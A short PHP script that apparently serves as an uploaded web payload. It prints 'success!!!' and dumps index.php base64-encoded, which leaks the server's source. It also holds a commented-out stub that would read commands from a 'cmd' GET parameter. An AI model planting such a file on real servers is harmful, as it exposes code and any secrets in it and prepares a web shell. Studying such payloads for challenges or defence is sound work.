<?php
	echo("success!!!\n");
        //$command = $_GET['cmd'];
        //echo $command."\n";
        $yay = file_get_contents("index.php");
        echo base64_encode($yay);
        //show_source(__FILE__);
?>
